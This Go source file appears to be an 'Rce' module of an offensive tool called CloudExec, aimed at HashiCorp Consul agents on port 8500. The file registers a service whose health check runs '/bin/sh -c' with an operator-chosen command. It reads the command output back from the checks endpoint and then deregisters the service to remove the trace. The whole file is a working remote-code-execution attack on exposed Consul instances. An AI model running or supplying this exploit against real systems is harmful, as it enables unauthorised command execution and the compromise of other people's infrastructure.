package modules

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/cotsom/CloudExec/internal/utils"
)

type Rce struct {
}

type ServiceCheckRce struct {
	Args     []string `json:"Args,omitempty"`
	Interval string   `json:"interval,omitempty"`
}

type ServiceRegistrationRce struct {
	ID      string           `json:"ID"`
	Name    string           `json:"Name"`
	Address string           `json:"Address"`
	Port    int              `json:"Port"`
	Check   *ServiceCheckRce `json:"check,omitempty"`
}

func (m Rce) RunModule(target string, flags map[string]string, scheme string) {
	defport := "8500"
	if flags["port"] != "" {
		defport = flags["port"]
	}

	if flags["timeout"] == "" {
		flags["timeout"] = "20"
	}
	timeout, _ := strconv.Atoi(flags["timeout"])

	client := http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	url := fmt.Sprintf("%s://%s:%s", scheme, target, defport)

	serviceName := fmt.Sprintf("testservice-%s", utils.RandStringRunes(10))
	reg := ServiceRegistrationRce{
		ID:      serviceName,
		Name:    serviceName,
		Address: "127.0.0.1",
		Port:    80,
		Check: &ServiceCheckRce{
			Args:     []string{"/bin/sh", "-c", flags["exec"]},
			Interval: "1s",
		},
	}

	if err := registerServiceRce(&client, url, reg); err != nil {
		utils.Colorize(utils.ColorRed, fmt.Sprintf("%s[!] %s:%s - %s\n", utils.ClearLine, target, flags["port"], err))
		return
	}

	time.Sleep(2 * time.Second)

	checks, err := getChecks(client, url)
	if err != nil {
		fmt.Fprintln(os.Stderr, "get checks error:", err)
		_ = deregisterService(client, url, serviceName)
		return
	}

	found := false
	for key, c := range checks {
		if c.serviceID == serviceName || c.CheckID == "service:"+serviceName || key == "service:"+serviceName {
			if c.Output != "" {
				utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", target, c.Output))
			}
			found = true
			break
		}
	}
	if !found {
		fmt.Println("check wasn't found for svc", serviceName)
	}

	// fmt.Printf("Deregistering service %q ...\n", serviceName)
	if err := deregisterService(client, url, serviceName); err != nil {
		fmt.Fprintln(os.Stderr, "deregister error:", err)
		return
	}

}

func registerServiceRce(client *http.Client, addr string, reg ServiceRegistrationRce) error {
	url := fmt.Sprintf("%s/v1/agent/service/register", addr)
	b, err := json.Marshal(reg)
	if err != nil {
		return err
	}

	resp, err := utils.HttpRequest(url, http.MethodPut, b, *client)

	if err != nil {
		return err
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return fmt.Errorf("access denied registering service (HTTP %d) — token required or insufficient rights", resp.StatusCode)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("unexpected status registering service: %d", resp.StatusCode)
	}
	return nil
}
